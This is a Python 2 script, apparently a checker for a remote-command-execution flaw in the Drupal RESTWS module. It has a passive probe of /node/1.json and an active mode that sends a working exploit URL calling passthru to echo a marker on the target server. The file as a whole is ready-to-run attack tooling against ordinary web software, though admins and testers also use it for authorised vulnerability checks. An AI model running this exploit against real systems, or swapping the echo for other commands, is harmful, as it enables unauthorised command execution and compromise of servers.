# -*- coding: utf-8 -*-
from optparse import OptionParser
import httplib

def Show_Header():
	print ''
	print '▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄▄▄▄▄▌ ▐ ▄▌.▄▄ ·  ▄▄·  ▄ .▄▄▄▄ . ▄▄· ▄ •▄ ▄▄▄ .▄▄▄  '
	print '▀▄ █·▀▄.▀·▐█ ▀. •██  ██· █▌▐█▐█ ▀. ▐█ ▌▪██▪▐█▀▄.▀·▐█ ▌▪█▌▄▌▪▀▄.▀·▀▄ █·'
	print '▐▀▀▄ ▐▀▀▪▄▄▀▀▀█▄ ▐█.▪██▪▐█▐▐▌▄▀▀▀█▄██ ▄▄██▀▐█▐▀▀▪▄██ ▄▄▐▀▀▄·▐▀▀▪▄▐▀▀▄ '
	print '▐█•█▌▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌██▐█▌▐█▄▪▐█▐███▌██▌▐▀▐█▄▄▌▐███▌▐█.█▌▐█▄▄▌▐█•█▌'
	print '.▀  ▀ ▀▀▀  ▀▀▀▀  ▀▀▀  ▀▀▀▀ ▀▪ ▀▀▀▀ ·▀▀▀ ▀▀▀ · ▀▀▀ ·▀▀▀ ·▀  ▀ ▀▀▀ .▀  ▀'
	print ''
	print 'by @two06'
	print 'Usage: python restws_Check.py -t <target> [-a]'
	print 'Use -a to run an active scan (attempt to perform the exploit against the target'
	print ''

def SimpleCheck(target):
	if target.startswith('http://'):
		target = target.replace('http://', '')
	print 'Scanning %s ...' % target
	conn = httplib.HTTPConnection(target)
	conn.request('HEAD', '/node/1.json')
	res = conn.getresponse()
	if res.status == 200:
		return True
	return False

def ActiveScan(target):
	exploit = '/taxonomy_vocabulary/1122334455/passthru/echo%201122334455'
	if target.startswith('http://'):
		target = target.replace('http://', '')
	print 'Performing active scan on %s ...' % target
	conn = httplib.HTTPConnection(target)
	conn.request('GET', exploit)
	res = conn.getresponse()
	if res.status == 200:
		data = res.read()
		if '1122334455' in data:
			return True
	return False


Show_Header()

parser = OptionParser(usage='usage: %prog -t <target> [-a]')
parser.add_option('-t', '--target', dest='target', help='The target Drupal instance')
parser.add_option('-a', '--active', dest='activeScan', default=False, action='store_true', help='Performe a simple exploit when testing the instance')

(options, args) = parser.parse_args()
if not options.target:
	parser.error('Target is required')

if not options.activeScan:
	if SimpleCheck(options.target):
		print 'Target appears vulnerable!'
	else:
		print 'Target does not appear to be vulnerable :('
else:
	if ActiveScan(options.target):
		print 'Target is vulnerable!'
	else:
		print 'Target is not vulnerable :('

